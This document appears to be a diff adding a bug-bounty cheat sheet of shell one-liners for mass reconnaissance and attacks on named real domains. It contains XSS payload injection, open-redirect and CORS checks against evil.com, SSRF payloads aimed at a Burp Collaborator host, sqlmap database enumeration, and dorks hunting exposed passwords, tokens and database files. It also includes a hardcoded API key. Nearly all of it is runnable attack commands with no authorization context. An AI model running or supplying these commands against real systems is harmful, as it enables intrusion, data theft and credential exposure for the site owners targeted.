@@ -1,0 +1,195 @@
+gau jfrog.com | httpx -follow-redirects -status-code -vhost -threads 300 -silent | sort -u | grep [200] | cut -d [ -f1 > jfroglive.txt  [for live domains ]
+
+cat resolved1.txt | egrep -iv ".(js|svg|png|gif|woff|jpg|swf|pdf|ttf|jpeg|ico|css|txt)" | tee -a resolved3.txt
+
+subfinder -d unibet.com | tee -a domains  cat domains | httpx | tee -a alive.txt  cat alive.txt | waybackurls | tee -a unibeturl | gf sqli urls >> sqli sqlmap -m --dbs --batch
+
+gau https://jfrog.com/ | tee -a jfrog.txt  cat jfrog.txt | httpx | tee -a jfrogalive.txt cat jfrogalive.txt | gf xss
+
+cat jfroggau.txt | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host"; done
+
+cat brusselsairlines.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done   [open redirect]
+
+ffuf -c -w ./wordlist.txt -u https://target/FUZZ -replay-proxy http://localhost:8080
+ffuf -c -w ./wordlist.txt -u https://target/FUZZ -x http://localhost:8080
+
+1) Check if any of the hosts is exposing the Apache server status page:
+
+cat hosts.txt | httpx -path /server-status?full=true -status-code -content-length
+
+2) Check if any of the hosts is exposing the JBoss web console:
+
+cat hosts.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length
+
+3) Check if any of the hosts is exposing the phpinfo debug page:
+
+cat hosts.txt | httpx -path /phpinfo.php -status-code -content-length -title
+
+
+Here’s what @_justYnot did exactly:
+
+Run subfinder -d target.com | httprobe -c 100 > target.txt . Got around 210 subdomains.
+Run cat target.txt | aquatone -out ~aquatone/target to capture web screenshots.
+Checked every screenshot and found an interesting subdomain.
+Tried for some low hanging bugs XSS, open redirect etc, but nothing worked.
+Then he decided to brute force the directories, he used ffuf and one of the wordlists from @DanielMiessler SecLists.
+Run ffuf -w path/to/wordlist.txt -u https://sub.target.com/FUZZ -mc all -c -v
+And after some time he got an endpoint which was exposing /debug/pprof which had a lot of sensitive info such as debug info, traces etc.
+Reported the issue to company and they quickly fixed it and acknowledged his work!
+
+amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500
+
+11. Find JavaScript files with httpx and subjs
+
+cat domains | httpx -silent | subjs | anew
+
+13. List of 14 Google dorks for recon and easy wins
+
+# Login panel search
+site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login
+
+# Login panel search #2
+intitle:"login" "admin" site:target.com
+
+# Admin panel search
+inurl:admin site:target.com
+
+# Search for our target's exposed files
+site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb
+
+# Get open directories (index of)
+intitle:"index of /" Parent Directory site:target.com
+
+# Search for exposed admin directories
+intitle:"index of /admin" site:target.com
+
+# Search for exposed password directories
+intitle:"index of /password" site:target.com
+
+# Search for directories with mail
+intitle:"index of /mail" site:target.com
+
+# Search for directories containing passwords
+intitle:"index of /" (passwd | password.txt) site:target.com
+
+# Search for directories containing .htaccess
+intitle:"index of /" .htaccess site:target.com
+
+# Search for .txt files with passwords
+inurl:passwd filetype:txt site:target.com
+
+# Search for potentially sensitive database files
+inurl:admin filetype:db site:target.com
+
+# Search for log files
+filetype:log site:target.com
+
+# Search for other sites that are linking to our target
+link:target.com -site:target.com
+
+14. Find web servers vulnerable to CORS attacks
+assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
+
+cuting "URL:" FROM kxss result file $ cut -c 5- < testcp.txt > output.txt
+cutting values after = in parameters $ sed "s/\=.*//" 2test.tx | tee -a sorted.txt
+cutting values before abc in file: $ echo "123 456 789 abc 111 abc 222 333" | perl -p -e 's/^.*?abc/abc/'
+cutting specific word from file: sed 's/word-to-find//g' input.file > output.file
+				  sed -i 's/word-to-find//g' input.file
+adding = to the parameter value $ awk '{print $0"="}' sorted.txt > newsorted.txt
+
+# Subdomains from Wayback Machine
+gau -subs example.com | cut -d / -f 3 | sort -u
+
+Using dnsgen to find new domains from a list of domains, I used amass on the list (army1).
+
+$  xargs -a amasssubs.txt -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 1000
+
+Search subdomains in cert.sh assetfinder to search in link /.git/HEAD
+
+curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+
+curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+
+Using gargs to gospider search with parallel proccess
+
+httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
+
+Chaos to Gospider
+
+chaos -d kiwi.com -key 628d4b621b520fb37a4802d39bfe3a415bd9571e42afda8abab3f756a4c14b59 -o kiwi -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
+
+finding .git to all subdomains
+
+curl -s "https://crt.sh/?q=bitgo.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+
+2. Use grep to extract URLs
+
+cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+
+
+Token analysis, endpoints in .js.
+Great tool for automation, today I found a critical, access token to a database.
+
+rush -i urls.txt 'python3 http://SecretFinder.py -i {} -o cli'
+
+word list from target website gauurls
+
+cat urls.txt | cut -d "/" -f4,5 | sort -u --version-sort | grep -Eiv "\;base64\,|?[A-Z]=[A-Z]|\.jpg$|\.png$|\.target|\.pdf|?[a-z]=[0-9]|\.gif|\.css" | tee words.txt
+
+grep -aiE "\.zip$|\.zip\.[0-9]+$|\.rar$|\.tar$|\.tar\.gz$|\.tgz$|\.sql$|\.db$|\.sqlite$|\.pgsql\.txt$|\.mysql\.txt$|\.gz$|\.config$|\.log$|\.bak$|\.backup$|\.bkp$|\.crt$|\.dat$|\.eml$|\.java$|\.lst$|\.key$|\.passwd$|\.pl$|\.pwd$|\.mysql-connect$|\.jar$|\.cfg$|\.dir$|\.orig$|\.bz2$|\.old$|\.vbs$|\.img$|\.inf$|\.sh$|\.py$|\.vbproj$|\.mysql-pconnect$|\.war$|\.go$|\.psql$|\.sql\.gz$|\.vb$|\.webinfo$|\.jnlp$|\.cgi$|\.temp$|\.ini$|\.webproj$|\.xsql$|\.raw$|\.inc$|\.lck$|\.nz$|\.rc$|\.html\.gz$\.gz$|\.env$|\.yml$" | sort -u | httpx -silent -follow-redirects -threads 800 -mc 200 > leaks.txt
+
+
+grep files and move to specific folder
+grep -i -Z -r -l 'string' . | xargs -I{} mv {} ./folder_name
+
+
+XSS automation
+
+xargs -a hackerone.txt -I@ sh -c 'python3 paramspider.py -d @ -l high'
+
+mass scan to list of ip in a file
+masscan -iL sortedips.txt -p0-65535 --max-rate 100000 -oX av.ru.txt
+
+adding https:// to every ip in a file 
+cat sortedips.txt | ts https:// | tr -d ' ' | tee -a sortedipsnew.txt
+
+for finding wp-admin to every subdomain
+httpx -l allsubsarrivalcom.txt -threads 100 -path /wp-admin/setup-config.php?step=1 -title  -status-code 
+
+finding elmah.axd file for every subdomain 
+httpx -l hosts.txt -path /elmah.axd status-code -title 
+
+from the list and filter out all the urls containing parameter for testing for vulnerability
+cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
+
+parameter sparing with some bash tricks to add my burp collaborator payload and proxy all urls to burp proxy
+xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=http://burpcollabrator.net”;done’ | httpx -http-proxy http://127.0.0.1:8080
+
+github dorks
+“testdev.example.com” user:<username> <keytosearch>
+“corps.example.com” user:<username> <keytosearch>
+“test.example.com” user:<username> <keytosearch>
+So I used some simple dorks like below but not leaked were found
+“testdev.admin.example.com” user:<username> auth_token
+“testdev.admin.example.com” user:<username> apikey
+“testdev.admin.example.com” user:<username> secret
+
+First i tried to find endpoint and path for admin and user dashboard
+“corps.example.com” org:<name of organization> “/admin/dashboard”
+“testdev.example.com” org:<name of organization> “/users/dashboard”
+“example.com” org:<name of organization> “/admin/setup”
+
+“example.com” org:<name of organization> “next_url”
+“example.com” org:<name of organization> “img_url”
+Still no success But when i use these parameter “image”
+“example.com” org:<name of organization> “image”
+
+adding my simple xss payload to see there whether it is reflected or not with some bash tricks to proxy the request to my burp
+xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=xsst<>”;done’ | httpx -http-proxy http://127.0.0.1:8080
+
+finding admin from subdomains list
+subfinder -d target.com -silent | sed ‘s/$/\/admin/’ | httpx -title -status-code -content-length
+
+
+
